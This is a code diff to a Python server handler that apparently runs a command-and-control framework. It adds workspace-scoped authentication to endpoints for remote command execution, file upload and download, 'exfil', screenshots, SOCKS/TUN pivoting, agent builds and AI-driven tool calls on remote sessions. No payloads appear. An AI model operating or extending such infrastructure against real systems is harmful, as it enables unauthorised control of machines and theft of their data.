+            session, error = srv.claim_workspace_session(workspace_id, str(body.get("session_id") or "").strip())
+            if error == "session_claimed":
+                self._json(409, {"error": error})
+            elif error:
+                self._json(404 if error == "session_not_found" else 400, {"error": error})
+            else:
+                self._json(200, {"ok": True, "session": session.to_dict()})
+            return True
+
+        if len(parts) == 5 and parts[:2] == ["workspace", "sessions"] and parts[4] == "tasks":
+            if not workspace_id:
+                self._json(403, {"error": "workspace_auth_required"})
+                return True
+            channel = parts[3]
+            tasks = body.get("tasks")
+            if channel not in {"socks", "tun"} or not isinstance(tasks, list):
+                self._json(400, {"error": "invalid_workspace_tasks"})
+                return True
+            session = srv.resolve_workspace_session(workspace_id, parts[2])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            if not srv.workspace_submit_tasks(workspace_id, session.id, channel, tasks):
+                self._json(409, {"error": "workspace_pivot_inactive"})
+                return True
+            self._json(200, {"ok": True, "session_id": session.id, "channel": channel})
+            return True
 
         if parts == ["agent", "go", "build"]:
             try:
@@ -2825,7 +3269,7 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "commands":
-            session = srv.resolve_session(parts[1])
+            session = _resolve_api_session(self, parts[1])
             if not session:
                 self._json(404, {"error": "session_not_found"})
                 return True
@@ -2848,10 +3292,10 @@ class RMMHandler(BaseHTTPRequestHandler):
             if not command:
                 self._json(400, {"error": "missing_command"})
                 return True
-            session = srv.resolve_session(parts[1])
+            session = _resolve_api_session(self, parts[1])
             if session:
                 srv.record_operator_action(session, command, "exec")
-            result, status = srv.exec_and_wait(parts[1], command, timeout=timeout)
+            result, status = srv.exec_and_wait(session.id if session else parts[1], command, timeout=timeout)
             if status == "not_found":
                 self._json(404, {"error": "session_not_found"})
                 return True
@@ -2862,7 +3306,7 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "upload":
-            session = srv.resolve_session(parts[1])
+            session = _resolve_api_session(self, parts[1])
             if not session:
                 self._json(404, {"error": "session_not_found"})
                 return True
@@ -2883,7 +3327,7 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "download":
-            session = srv.resolve_session(parts[1])
+            session = _resolve_api_session(self, parts[1])
             if not session:
                 self._json(404, {"error": "session_not_found"})
                 return True
@@ -2897,7 +3341,7 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "exfil":
-            session = srv.resolve_session(parts[1])
+            session = _resolve_api_session(self, parts[1])
             if not session:
                 self._json(404, {"error": "session_not_found"})
                 return True
@@ -2931,7 +3375,7 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "screenshot":
-            session = srv.resolve_session(parts[1])
+            session = _resolve_api_session(self, parts[1])
             if not session:
                 self._json(404, {"error": "session_not_found"})
                 return True
@@ -2941,7 +3385,7 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "pe":
-            session = srv.resolve_session(parts[1])
+            session = _resolve_api_session(self, parts[1])
             if not session:
                 self._json(404, {"error": "session_not_found"})
                 return True
@@ -2987,7 +3431,7 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "socks":
-            session = srv.resolve_session(parts[1])
+            session = _resolve_api_session(self, parts[1])
             if not session:
                 self._json(404, {"error": "session_not_found"})
                 return True
@@ -3019,7 +3463,7 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "tun":
-            session = srv.resolve_session(parts[1])
+            session = _resolve_api_session(self, parts[1])
             if not session:
                 self._json(404, {"error": "session_not_found"})
                 return True
@@ -3088,11 +3532,19 @@ class RMMHandler(BaseHTTPRequestHandler):
             if skill_ids is not None and not isinstance(skill_ids, list):
                 self._json(400, {"error": "invalid_skill_ids"})
                 return True
+            workspace_id = getattr(self, "_workspace_scope", lambda: None)()
+            workspace_token = self.headers.get("X-RMM-Workspace-Token", "").strip() if workspace_id else ""
+            rmm_headers = {}
+            if workspace_id and workspace_token:
+                rmm_headers = {
+                    "X-RMM-Workspace": workspace_id,
+                    "X-RMM-Workspace-Token": workspace_token,
+                }
             rmm_token = (self._api_token_from_request() or API_TOKEN or "").strip()
-            if not rmm_token:
+            if not rmm_token and not rmm_headers:
                 self._json(401, {
                     "error": "unauthorized",
-                    "detail": "Valid RMM_API_TOKEN required for AI tool calls",
+                    "detail": "Valid RMM_API_TOKEN or workspace credentials required for AI tool calls",
                 })
                 return True
             try:
@@ -3101,6 +3553,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                 result = run_ai_chat(
                     rmm_base_url=self._operator_api_base_url(),
                     rmm_token=rmm_token,
+                    rmm_headers=rmm_headers,
                     provider=provider,
                     api_key=api_key,
                     messages=messages,
@@ -3160,7 +3613,7 @@ class RMMHandler(BaseHTTPRequestHandler):
         srv = self.server_instance
 
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "config":
-            session = srv.resolve_session(parts[1])
+            session = _resolve_api_session(self, parts[1])
             if not session:
                 self._json(404, {"error": "session_not_found"})
                 return True
@@ -3195,6 +3648,9 @@ class RMMHandler(BaseHTTPRequestHandler):
         srv = self.server_instance
 
         if len(parts) == 4 and parts[0] == "sessions" and parts[2] == "ai" and parts[3] == "chat":
+            if getattr(self, "_workspace_scope", lambda: None)() and not _resolve_api_session(self, parts[1]):
+                self._json(404, {"error": "session_not_found"})
+                return True
             session_id, _messages = srv.get_ai_chat(parts[1])
             if session_id is None:
                 self._json(404, {"error": "session_not_found"})
@@ -3204,7 +3660,11 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 2 and parts[0] == "sessions":
-            ok, detail = srv.kill_session(parts[1])
+            session = _resolve_api_session(self, parts[1])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            ok, detail = srv.kill_session(session.id)
             if not ok:
                 self._json(404, {"error": "session_not_found"})
                 return True
